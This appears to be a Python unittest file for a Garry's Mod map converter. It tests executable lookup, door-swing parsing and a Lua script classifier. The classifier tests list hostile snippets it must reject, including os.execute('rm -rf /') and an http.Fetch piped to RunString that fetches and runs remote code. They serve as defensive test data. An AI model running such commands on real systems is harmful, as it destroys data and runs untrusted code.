class FastgmadLookup(unittest.TestCase):
    def test_localappdata_is_searched_on_windows_only(self):
        with tempfile.TemporaryDirectory() as t:
            exe = os.path.join(t, "fastgmad", "fastgmad.exe")
            os.makedirs(os.path.dirname(exe))
            with open(exe, "w") as fh:
                fh.write("x")
            os.chmod(exe, 0o755)
            keep = (gma._on_windows, os.environ.get("LOCALAPPDATA"), os.environ.get("DOTBSP_FASTGMAD"), os.environ.get("PATH"))
            try:
                os.environ["PATH"] = t                       # nothing named fastgmad here
                os.environ.pop("DOTBSP_FASTGMAD", None)
                os.environ["LOCALAPPDATA"] = t
                gma._on_windows = lambda: True
                found = gma.find_fastgmad()
                home_hit = os.path.isfile(os.path.expanduser("~/.local/bin/fastgmad"))
                self.assertEqual(found, exe if not home_hit else found)
                self.assertIn(exe, gma._windows_candidates())
                gma._on_windows = lambda: False               # elsewhere: a no-op
                self.assertEqual(gma._windows_candidates(), [])
                if not home_hit:
                    self.assertIsNone(gma.find_fastgmad())
                gma._on_windows = lambda: True
                del os.environ["LOCALAPPDATA"]                 # unset: a no-op too
                self.assertEqual(gma._windows_candidates(), [])
            finally:
                gma._on_windows = keep[0]
                for k, v in zip(("LOCALAPPDATA", "DOTBSP_FASTGMAD", "PATH"), keep[1:]):
                    if v is None:
                        os.environ.pop(k, None)
                    else:
                        os.environ[k] = v


class PropDoorSwing(unittest.TestCase):
    """A model door's direction comes from opendir and spawnpos, never from the brush-door reverse flag."""

    class _Bsp:
        def __init__(self, ents):
            self.entities, self.models = ents, []

    def rec(self, **keys):
        from dotbsp import movers
        e = {"classname": "prop_door_rotating", "origin": "0 0 0", "angles": "0 90 0", "spawnflags": "8192"}
        e.update({k: str(v) for k, v in keys.items()})
        return movers.movers(self._Bsp([e]), owners={})[0]

    def test_directions(self):
        r = self.rec(spawnflags=8194, distance=90)          # bit 2 is not "reverse" on a model door
        self.assertEqual((r["degrees"], r["open_dir"], r["yaw"], r["start_open"]), (90.0, 0, 90.0, False))
        self.assertEqual(self.rec(opendir=2)["degrees"], -90.0)
        self.assertEqual(self.rec(opendir=1)["open_dir"], 1)

    def test_spawnpos(self):
        r = self.rec(spawnpos=2)
        self.assertTrue(r["start_open"])
        self.assertEqual(r["spawn_side"], -1.0)
        self.assertNotIn("spawn_side", self.rec(spawnpos=0))
        self.assertTrue(self.rec(spawnflags=8193)["start_open"])


class LuaRun(unittest.TestCase):
    SPEED = "for i, ply in pairs(player.GetAll()) do if (ply:IsValid()) then ply:SetRunSpeed( 185 ) end end"
    RESET = "for k,v in pairs (player.GetAll()) do v:Kill() end timer.Simple(.25, function() game.CleanUpMap(false)  end)"

    def test_templates_translate_to_whitelisted_operations(self):
        from dotbsp import scripts
        st, ops, _ = scripts.classify(self.SPEED)
        self.assertEqual((st, ops), ("translated", [{"op": "set_player_speed", "kind": "run", "value": 185.0}]))
        st, ops, _ = scripts.classify(self.SPEED.replace("Run", "Walk").replace("185", "120"))
        self.assertEqual(ops[0]["kind"], "walk")
        st, ops, _ = scripts.classify(self.RESET)
        self.assertEqual([o["op"] for o in ops], ["kill_players", "cleanup_map"])
        self.assertEqual(ops[1]["delay"], 0.25)
        self.assertTrue(all(scripts.valid_op(o) for o in ops))

    def test_hostile_and_near_miss_snippets_are_never_translated(self):
        from dotbsp import scripts
        for code in (self.SPEED + " os.execute('rm -rf /')", "os.execute('x') " + self.SPEED,
                     self.SPEED.replace("185", "99999"), self.SPEED.replace("ply:SetRunSpeed( 185 )", "RunConsoleCommand('quit')"),
                     self.RESET + " http.Fetch('http://x', RunString)", "RunString(file.Read('x'))", "", "x = 1",
                     self.SPEED + "\n" + self.SPEED):
            st, ops, _ = scripts.classify(code)
            self.assertEqual((st, ops), ("unhandled", []), code)

    def test_valid_op_refuses_forged_operations(self):
        from dotbsp import scripts
        for op in ({"op": "exec", "cmd": "x"}, {"op": "set_player_speed", "kind": "run"}, {"op": "set_player_speed", "kind": "fly", "value": 5},
                   {"op": "set_player_speed", "kind": "run", "value": True}, {"op": "kill_players", "x": 1}, "kill_players"):
            self.assertFalse(scripts.valid_op(op), op)

    def test_analyse_and_annotate_a_document(self):
        from dotbsp import scripts
        def ent(i, cls, tn, pairs=(), outs=()):
            return {"index": i, "classname": cls, "targetname": tn, "parentname": "", "pairs": [list(p) for p in pairs], "outputs": list(outs)}
        ents = [ent(0, "lua_run", "speed", [("code", self.SPEED)]), ent(1, "lua_run", "evil", [("code", "os.execute('x')")]),
                ent(2, "func_button", "b", [], [{"output": "OnPressed", "target": "speed", "input": "RunCode", "param": "", "delay": 0, "times": -1},
                                                {"output": "OnPressed", "target": "evil", "input": "RunPassedCode", "param": "Foo:Bar()", "delay": 0, "times": -1}])]
        rows = scripts.annotate(ents)
        self.assertEqual([(r["source"], r["status"]) for r in rows], [("code", "translated"), ("code", "unhandled"), ("RunPassedCode", "unhandled")])
        self.assertEqual(rows[0]["fired_by"], 1)
        self.assertEqual(ents[0]["script"]["status"], "translated")
        self.assertEqual(ents[1]["script"]["ops"], [])
        self.assertNotIn("script", ents[2])
        class Raw(dict):
            pairs = [("classname", "lua_run"), ("targetname", "s"), ("code", self.SPEED)]
        raw = Raw(classname="lua_run", targetname="s")
        self.assertEqual(scripts.analyse([raw])[0]["status"], "translated")
        self.assertEqual(scripts.shape("WMI.SetWMIOut('w','input3a','Switch State',0)"), scripts.shape("WMI.SetWMIOut('w','input1b','Back Switch State',2)"))


@unittest.skipUnless(os.environ.get("DOTBSP_TEST_MAPS"), "set DOTBSP_TEST_MAPS to a folder of real maps")
class RealMaps(unittest.TestCase):
    def test_each(self):
        root = os.environ["DOTBSP_TEST_MAPS"]
        for s in sources.find([root]):
            with self.subTest(map=s.name):
                b = reader.Bsp(s.label(), data=s.read()).load()
                d = intermediate.build(b, name=s.name)
                self.assertEqual(intermediate.check(d), [])
                self.assertGreater(d["counts"]["brushes"], 0)


if __name__ == "__main__":
    unittest.main()
